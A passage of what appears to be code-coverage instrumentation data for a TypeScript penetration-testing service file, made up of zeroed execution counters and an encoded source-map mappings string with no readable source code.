      "167": 0,
      "168": 0,
      "169": 0,
      "170": 0,
      "171": 0,
      "172": 0,
      "173": 0,
      "174": 0,
      "175": 0,
      "176": 0,
      "177": 0,
      "178": 0,
      "179": 0,
      "180": 0,
      "181": 0,
      "182": 0,
      "183": 0,
      "184": 0,
      "185": 0,
      "186": 0,
      "187": 0,
      "188": 0,
      "189": 0,
      "190": 0,
      "191": 0,
      "192": 0,
      "193": 0,
      "194": 0,
      "195": 0,
      "196": 0,
      "197": 0,
      "198": 0,
      "199": 0,
      "200": 0,
      "201": 0,
      "202": 0,
      "203": 0,
      "204": 0,
      "205": 0,
      "206": 0,
      "207": 0,
      "208": 0,
      "209": 0,
      "210": 0,
      "211": 0,
      "212": 0,
      "213": 0,
      "214": 0,
      "215": 0,
      "216": 0,
      "217": 0,
      "218": 0,
      "219": 0,
      "220": 0,
      "221": 0,
      "222": 0,
      "223": 0,
      "224": 0,
      "225": 0,
      "226": 0,
      "227": 0,
      "228": 0,
      "229": 0,
      "230": 0,
      "231": 0,
      "232": 0,
      "233": 0,
      "234": 0,
      "235": 0,
      "236": 0,
      "237": 0,
      "238": 0,
      "239": 0,
      "240": 0,
      "241": 0,
      "242": 0,
      "243": 0,
      "244": 0,
      "245": 0,
      "246": 0,
      "247": 0,
      "248": 0,
      "249": 0,
      "250": 0,
      "251": 0,
      "252": 0,
      "253": 0,
      "254": 0,
      "255": 0,
      "256": 0,
      "257": 0,
      "258": 0,
      "259": 0,
      "260": 0,
      "261": 0,
      "262": 0,
      "263": 0,
      "264": 0,
      "265": 0,
      "266": 0,
      "267": 0,
      "268": 0,
      "269": 0,
      "270": 0,
      "271": 0,
      "272": 0,
      "273": 0,
      "274": 0,
      "275": 0,
      "276": 0,
      "277": 0,
      "278": 0,
      "279": 0,
      "280": 0,
      "281": 0,
      "282": 0,
      "283": 0,
      "284": 0,
      "285": 0,
      "286": 0,
      "287": 0,
      "288": 0,
      "289": 0,
      "290": 0,
      "291": 0,
      "292": 0,
      "293": 0,
      "294": 0,
      "295": 0,
      "296": 0,
      "297": 0,
      "298": 0,
      "299": 0,
      "300": 0,
      "301": 0,
      "302": 0,
      "303": 0,
      "304": 0,
      "305": 0,
      "306": 0,
      "307": 0,
      "308": 0,
      "309": 0,
      "310": 0,
      "311": 0,
      "312": 0,
      "313": 0,
      "314": 0,
      "315": 0,
      "316": 0,
      "317": 0,
      "318": 0,
      "319": 0,
      "320": 0,
      "321": 0,
      "322": 0,
      "323": 0,
      "324": 0,
      "325": 0,
      "326": 0,
      "327": 0,
      "328": 0,
      "329": 0,
      "330": 0,
      "331": 0,
      "332": 0,
      "333": 0,
      "334": 0,
      "335": 0,
      "336": 0,
      "337": 0,
      "338": 0,
      "339": 0,
      "340": 0,
      "341": 0,
      "342": 0,
      "343": 0
    },
    f: {
      "0": 0,
      "1": 0,
      "2": 0,
      "3": 0,
      "4": 0,
      "5": 0,
      "6": 0,
      "7": 0,
      "8": 0,
      "9": 0,
      "10": 0,
      "11": 0,
      "12": 0,
      "13": 0,
      "14": 0,
      "15": 0,
      "16": 0,
      "17": 0,
      "18": 0,
      "19": 0,
      "20": 0,
      "21": 0,
      "22": 0,
      "23": 0,
      "24": 0,
      "25": 0,
      "26": 0,
      "27": 0,
      "28": 0,
      "29": 0,
      "30": 0,
      "31": 0,
      "32": 0,
      "33": 0,
      "34": 0,
      "35": 0,
      "36": 0,
      "37": 0,
      "38": 0,
      "39": 0,
      "40": 0,
      "41": 0,
      "42": 0,
      "43": 0,
      "44": 0,
      "45": 0,
      "46": 0,
      "47": 0,
      "48": 0,
      "49": 0,
      "50": 0,
      "51": 0,
      "52": 0,
      "53": 0,
      "54": 0,
      "55": 0,
      "56": 0,
      "57": 0,
      "58": 0,
      "59": 0,
      "60": 0,
      "61": 0,
      "62": 0,
      "63": 0
    },
    b: {
      "0": [0, 0, 0],
      "1": [0, 0],
      "2": [0, 0],
      "3": [0, 0],
      "4": [0, 0],
      "5": [0, 0],
      "6": [0, 0],
      "7": [0, 0],
      "8": [0, 0, 0],
      "9": [0, 0],
      "10": [0, 0, 0],
      "11": [0, 0],
      "12": [0, 0],
      "13": [0, 0],
      "14": [0, 0],
      "15": [0, 0],
      "16": [0, 0],
      "17": [0, 0, 0],
      "18": [0, 0],
      "19": [0, 0],
      "20": [0, 0],
      "21": [0, 0],
      "22": [0, 0],
      "23": [0, 0],
      "24": [0, 0],
      "25": [0, 0],
      "26": [0, 0],
      "27": [0, 0],
      "28": [0, 0],
      "29": [0, 0],
      "30": [0, 0],
      "31": [0, 0],
      "32": [0, 0],
      "33": [0, 0],
      "34": [0, 0],
      "35": [0, 0],
      "36": [0, 0],
      "37": [0, 0],
      "38": [0, 0],
      "39": [0, 0],
      "40": [0, 0],
      "41": [0, 0],
      "42": [0, 0],
      "43": [0, 0],
      "44": [0, 0],
      "45": [0, 0],
      "46": [0, 0],
      "47": [0, 0],
      "48": [0, 0],
      "49": [0, 0],
      "50": [0, 0],
      "51": [0, 0],
      "52": [0, 0],
      "53": [0, 0],
      "54": [0, 0],
      "55": [0, 0],
      "56": [0, 0],
      "57": [0, 0],
      "58": [0, 0],
      "59": [0, 0],
      "60": [0, 0],
      "61": [0, 0, 0, 0],
      "62": [0, 0],
      "63": [0, 0],
      "64": [0, 0],
      "65": [0, 0],
      "66": [0, 0],
      "67": [0, 0],
      "68": [0, 0],
      "69": [0, 0],
      "70": [0, 0],
      "71": [0, 0],
      "72": [0, 0],
      "73": [0, 0],
      "74": [0, 0],
      "75": [0],
      "76": [0],
      "77": [0, 0],
      "78": [0, 0],
      "79": [0, 0],
      "80": [0, 0],
      "81": [0, 0],
      "82": [0, 0],
      "83": [0, 0],
      "84": [0, 0],
      "85": [0, 0],
      "86": [0, 0],
      "87": [0, 0],
      "88": [0, 0],
      "89": [0, 0],
      "90": [0, 0],
      "91": [0, 0],
      "92": [0, 0],
      "93": [0, 0],
      "94": [0, 0],
      "95": [0, 0]
    },
    inputSourceMap: {
      file: "C:\\Users\\Nick\\Desktop\\SmoothSail\\src\\security\\penetration-testing-service.ts",
      mappings: "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